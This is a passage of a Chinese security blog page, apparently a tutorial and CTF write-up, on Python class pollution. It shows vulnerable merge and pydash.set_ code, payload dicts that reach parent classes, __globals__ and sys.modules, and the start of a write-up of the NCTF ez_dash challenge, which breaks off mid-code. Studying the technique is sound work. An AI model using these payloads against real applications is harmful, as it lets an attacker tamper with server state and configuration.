@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+<!-- keywords -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="夏饭orz">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="夏饭orz">
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    <meta name="description" content="冒险者，欢迎光临🌹">
+    <meta name="description" content="简介 污染只对类的属性起作用，对于类方法是无效的 可以对全局属性进行污染  污染方法常见函数merge函数123456789101112def merge(src, dst):    # Recursive merge function    for k, v in src.items(): #遍历src的item属性，键为k，值为v        if hasattr(dst, &#x27;__">
+<meta property="og:type" content="article">
+<meta property="og:title" content="py原型链污染">
+<meta property="og:url" content="http://example.com/2025/06/22/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/index.html">
+<meta property="og:site_name" content="夏饭の小饭堂">
+<meta property="og:description" content="简介 污染只对类的属性起作用，对于类方法是无效的 可以对全局属性进行污染  污染方法常见函数merge函数123456789101112def merge(src, dst):    # Recursive merge function    for k, v in src.items(): #遍历src的item属性，键为k，值为v        if hasattr(dst, &#x27;__">
+<meta property="og:locale">
+<meta property="og:image" content="http://example.com/images/image-20250331223408817.png">
+<meta property="article:published_time" content="2025-06-22T06:30:00.000Z">
+<meta property="article:modified_time" content="2025-06-22T15:13:56.209Z">
+<meta property="article:author" content="夏饭orz">
+<meta property="article:tag" content="web漏洞">
+<meta property="article:tag" content="python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/image-20250331223408817.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/taco-truck.png">
+    <title>py原型链污染 · 夏饭の小饭堂</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .footer-fixed-btn,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(
+            -45deg,
+            #444 0,
+            #444 80px,
+            #333 80px,
+            #333 160px
+        );
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link id="stylesheet-fancybox" rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-base" rel="preload" href="/css/style.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-mobile" rel="preload" href="/css/mobile.css" as="style" onload="this.onload=null;this.rel='stylesheet';this.media='screen and (max-width: 960px)'">
+    <link id="stylesheet-theme-dark" rel="preload" href="/css/dark.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    <!-- 百度统计  -->
+    <!-- 谷歌统计  -->
+    <!-- Google tag (gtag.js) -->
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+        <body class="post-body">
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        <div class="header-sidebar-menu">
+            <div style="padding-left: 1px;">&#xe775;</div>
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href="/">夏饭の小饭堂.</a>
+        </span>
+    </div>
+    <!-- toggle banner -->
+    <div class="banner">
+        <div class="blog-title header-element">
+            <a href="/">夏饭の小饭堂.</a>
+        </div>
+        <div class="post-title header-element">
+            <a href="#" class="post-name">py原型链污染</a>
+        </div>
+    </div>
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- donate button -->
+
+    <!-- back to top button -->
+    <div class="footer-fixed-btn footer-fixed-btn--hidden back-top">
+        <div>&#xe639;</div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="    height:50vh;
+">
+    <!-- 主页  -->
+    <!-- 404页  -->
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/54_i12.png)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+                py原型链污染
+            <!-- 404 -->
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            <!-- 404 -->
+        </p>
+        <!-- 文章页 meta -->
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                    <div class="post-intro-tags" >
+        <a class="post-tag" href="javascript:void(0);" data-tags="web漏洞">web漏洞</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="python">python</a>
+</div>
+
+                <!-- 文章字数统计 -->
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2025/06/22</span>
+                    <!-- busuanzi -->
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" alt="loading">
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ul>
+<li>污染只对类的属性起作用，对于类方法是无效的</li>
+<li>可以对全局属性进行污染</li>
+</ul>
+<h1 id="污染方法"><a href="#污染方法" class="headerlink" title="污染方法"></a>污染方法</h1><h2 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h2><h3 id="merge函数"><a href="#merge函数" class="headerlink" title="merge函数"></a>merge函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items(): <span class="comment">#遍历src的item属性，键为k，值为v</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):  <span class="comment">#检查dst对象是否有__getitem__属性，如果存在则可以将dst作为字典访问</span></span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:  <span class="comment">#如果dst也有k键且v是字典</span></span><br><span class="line">                merge(v, dst.get(k)) <span class="comment">#递归合并</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v <span class="comment">#其他情况把dst的k键赋值为v</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>: <span class="comment">#如果目标对象中已经存在该属性则只复制值</span></span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v) <span class="comment">#如果dst没有k属性，那就添加k属性且值为v</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="pydash"><a href="#pydash" class="headerlink" title="pydash"></a>pydash</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">setval</span>(<span class="params">name:<span class="built_in">str</span>, path:<span class="built_in">str</span>, value:<span class="built_in">str</span></span>)-&gt; <span class="type">Optional</span>[<span class="built_in">bool</span>]:</span><br><span class="line">    <span class="keyword">if</span> name.find(<span class="string">&quot;__&quot;</span>)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_name__:</span><br><span class="line">        <span class="keyword">if</span> name==word:</span><br><span class="line">            <span class="built_in">print</span>(<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_path__:</span><br><span class="line">        <span class="keyword">if</span> path.find(word)&gt;=<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    obj=<span class="built_in">globals</span>()[name] <span class="comment">#某全局变量</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pydash.set_(obj,path,value)</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><h3 id="污染有继承关系属性"><a href="#污染有继承关系属性" class="headerlink" title="污染有继承关系属性"></a>污染有继承关系属性</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;haha&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>): <span class="comment">#使用 (father) 声明继承关系</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>): <span class="comment">#使用 (father) 声明继承关系</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = son_a()</span><br><span class="line"><span class="comment">#自定义属性</span></span><br><span class="line">payload1 = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span> : <span class="string">&quot;no way&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#内置属性同理</span></span><br><span class="line">payload2 = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span> : &#123; <span class="comment">#通过base找到父类进行污染</span></span><br><span class="line">            <span class="string">&quot;__str__&quot;</span> : <span class="string">&quot;Polluted~&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(son_a.secret) <span class="comment">#子类会继承父类属性</span></span><br><span class="line"><span class="comment">#haha</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret) <span class="comment">#实例子类会继承父类属性</span></span><br><span class="line"><span class="comment">#haha</span></span><br><span class="line">merge(payload1, instance) <span class="comment">#污染父类子类也会受影响</span></span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#no way</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#no way</span></span><br><span class="line">merge(payload2, instance)</span><br><span class="line"><span class="built_in">print</span>(father.__str__)</span><br><span class="line"><span class="comment">#Polluted~</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#并非所有类属性都能被污染，object类就不行</span></span><br><span class="line"><span class="comment">#merge(payload2, object)</span></span><br><span class="line"><span class="comment">#TypeError: cannot set &#x27;__str__&#x27; attribute of immutable type &#x27;object&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="修改无继承关系的类属性或者全局变量"><a href="#修改无继承关系的类属性或者全局变量" class="headerlink" title="修改无继承关系的类属性或者全局变量"></a>修改无继承关系的类属性或者全局变量</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&quot;nihao&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">b</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(father.secret)</span><br><span class="line"><span class="built_in">print</span>(str1)</span><br><span class="line">payload3 = &#123;<span class="string">&quot;__init__&quot;</span>:</span><br><span class="line">                &#123;<span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;str1&quot;</span>:<span class="number">514</span>,</span><br><span class="line">                    <span class="string">&quot;father&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;secret&quot;</span>:<span class="string">&quot;nihao&quot;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;&#125;&#125;</span><br><span class="line">instance = b()</span><br><span class="line">merge(payload3, instance)</span><br><span class="line"><span class="built_in">print</span>(father.secret)</span><br><span class="line"><span class="built_in">print</span>(str1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#加载关系简单(import)</span></span><br><span class="line"><span class="built_in">print</span>(test.nihao)</span><br><span class="line"><span class="built_in">print</span>(test.target_class.zaijian)</span><br><span class="line">payload3 = &#123;<span class="string">&quot;__init__&quot;</span>:</span><br><span class="line">                &#123;<span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;test&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;nihao&quot;</span>: <span class="number">222</span>,</span><br><span class="line">                        <span class="string">&quot;target_class&quot;</span>:&#123;</span><br><span class="line">                            <span class="string">&quot;zaijian&quot;</span>: <span class="string">&quot;chi l&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;&#125;&#125;</span><br><span class="line">instance = b()</span><br><span class="line">merge(payload3, instance)</span><br><span class="line"><span class="built_in">print</span>(test.nihao)</span><br><span class="line"><span class="built_in">print</span>(test.target_class.zaijian)</span><br><span class="line"></span><br><span class="line"><span class="comment">#加载关系复杂（sys）</span></span><br><span class="line">payload4 = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;sys&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;modules&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;test&quot;</span> : &#123;</span><br><span class="line">                        <span class="string">&quot;secret_var&quot;</span> : <span class="number">514</span>,</span><br><span class="line">                        <span class="string">&quot;target_class&quot;</span> : &#123;</span><br><span class="line">                            <span class="string">&quot;secret_class_var&quot;</span> : <span class="string">&quot;Poluuuuuuted ~&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;模块名&gt;.__loader__.__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>]</span><br><span class="line"><span class="comment">#对于python3来说除了在debug模式下的主文件中__loader__为None以外,正常执行的情况每个模块的__loader__属性均有一个对应的类</span></span><br><span class="line">&lt;模块名&gt;.__spec__.__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>]</span><br><span class="line">&lt;模块名&gt;.__spec__.loader__.__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>]</span><br><span class="line">&lt;模块名&gt;.__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.env</span><br></pre></td></tr></table></figure>
+
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例:"></a>实例:</h2><h3 id="NCTF-ez-dash-ez-dash-revenge"><a href="#NCTF-ez-dash-ez-dash-revenge" class="headerlink" title="[NCTF]ez_dash &amp; ez_dash_revenge"></a>[NCTF]ez_dash &amp; ez_dash_revenge</h3><ul>
+<li>py类原型链污染&amp;文件读取漏洞</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">def setval(name:str, path:str, value:str)-&gt; Optional[bool]:</span><br><span class="line">    <span class="keyword">if</span> name.find(<span class="string">&quot;__&quot;</span>)&gt;=0: <span class="built_in">return</span> False</span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_name__:</span><br><span class="line">        <span class="keyword">if</span> name==word:</span><br><span class="line">            <span class="built_in">print</span>(2)</span><br><span class="line">            <span class="built_in">return</span> False</span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_path__:</span><br><span class="line">        <span class="keyword">if</span> path.find(word)&gt;=0:</span><br><span class="line">            <span class="built_in">print</span>(1)</span><br><span class="line">            <span class="built_in">return</span> False</span><br><span class="line">    obj=globals()[name] <span class="comment">#某全局变量</span></span><br><span class="line">    try:</span><br><span class="line">        pydash.set_(obj,path,value)</span><br><span class="line">        <span class="built_in">print</span>(1)</span><br><span class="line">    except:</span><br><span class="line">        <span class="built_in">return</span> False</span><br><span class="line">    <span class="built_in">return</span> True</span><br><span class="line"></span><br><span class="line">@bottle.post(<span class="string">&#x27;/setValue&#x27;</span>)</span><br><span class="line">def set_value():</span><br><span class="line">    name = bottle.request.query.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    path=bottle.request.json.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> not isinstance(path,str):</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">    <span class="keyword">if</span> len(name)&gt;6 or len(path)&gt;32:</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    value=bottle.request.json.get(<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line">    <span 